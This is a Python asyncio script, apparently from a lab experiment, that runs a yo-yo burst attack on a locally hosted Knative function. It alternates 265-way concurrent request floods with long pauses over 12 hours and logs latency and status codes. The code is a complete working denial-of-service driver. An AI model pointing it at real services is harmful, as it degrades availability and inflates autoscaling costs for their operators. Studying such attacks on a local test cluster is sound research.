import aiohttp
import asyncio
import time
from datetime import datetime

# Configuration
TARGET_URL = "http://knative-fn4.default.127.0.0.1.nip.io/fib"
NORMAL_CONCURRENCY = 0
ATTACK_CONCURRENCY = 265            # Pod da scale aos 51, mas aumentar este valor mais so para ter a certez que da scale up 
ON_ATTACK_DURATION = 35             # 160 segundos foi o valor maximo ate um Pod começar a terminar antes do ataque terminar.
OFF_ATTACK_DURATION = 900           # 15 minutos updated minutos de pausa 
RUN_DURATION = 12 * 60 * 60         # Total run time in seconds (12 hours)
CONNECTION_TIMEOUT = aiohttp.ClientTimeout(total=10)           # Apenas para debug.
LOG_FILE = "logs/attack_metrics.log"


#Recupera mensagens , e escreve-as no log_file 
async def logger(queue, log_file):
    loop = asyncio.get_running_loop()
    while True:
        message = await queue.get()
        if message is None:
            break
        await loop.run_in_executor(None, write_log, log_file, message)

#Escreve de forma síncrona uma única mensagem de log, para conseguir ver as entradas de log visíveis direto.
def write_log(log_file, message):
    log_file.write(message)
    log_file.flush()


# Envia continuamente os pedidos HTTP GET para o URL do knative com o aiohttp até que stop_time seja atingido. 
# guarda ainda timestamp, a duração da resposta e o HTTP code 
async def worker(session, stop_time, queue):
    while time.time() < stop_time:
        start_time = time.perf_counter()
        timestamp = datetime.now().isoformat()
        try:
            async with session.get(TARGET_URL) as response:
                await response.text()  # Consume response
                end_time = time.perf_counter()
                duration = end_time - start_time
                status = response.status
                message = f"{timestamp},{duration:.3f},HTTP {status}\n"
        except Exception as e:
            end_time = time.perf_counter()
            duration = end_time - start_time
            error_msg = str(e)
            message = f"{timestamp},FAIL,{error_msg}\n"
        await queue.put(message)

# Começa o ataque em si  com os 'workers' concorrentes. 
# Cria um ClientSession aiohttp com um TCPConnector configurado para permitir as ligações ilimitadas e forçar  que termine. 
async def run_attack(concurrency, duration, queue):
    stop_time = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0, force_close=True)  
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=CONNECTION_TIMEOUT,
        auto_decompress=True
    ) as session:
        tasks = []
        for _ in range(concurrency):
            task = asyncio.create_task(worker(session, stop_time, queue))
            tasks.append(task)
        
        # Progress monitoring
        start_time = time.time()
        while time.time() < stop_time:
            elapsed = int(time.time() - start_time)
            remaining = int(stop_time - time.time())
            # apenas para eu visualizar se der erro in real time.
            print(f"\rActive: {len(tasks)} | Elapsed: {elapsed}s | Remaining: {remaining}s", end="")
            await asyncio.sleep(1)
        
        # Cleanup
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    print("Async YoYo Attack Script (12 hour total runtime)")
    print(f"Target: {TARGET_URL}")
    print(f"Attack Concurrency: {ATTACK_CONCURRENCY}")
    start_time = time.time()

    with open(LOG_FILE, "a") as log_file:
        queue = asyncio.Queue()
        logger_task = asyncio.create_task(logger(queue, log_file))
        try:
            while time.time() - start_time < RUN_DURATION:
                print("\n=== ATTACK PHASE ===")
                await run_attack(ATTACK_CONCURRENCY, ON_ATTACK_DURATION, queue)
                print("\n=== COOL DOWN ===")
                await run_attack(NORMAL_CONCURRENCY, OFF_ATTACK_DURATION, queue)
        except KeyboardInterrupt:
            print("\nAttack stopped")
        finally:
            # Passado as 12h para o ataque
            print("\nReached 12 hours. Stopping simulation.")
            await queue.put(None)
            await logger_task

if __name__ == "__main__":
    asyncio.run(main())
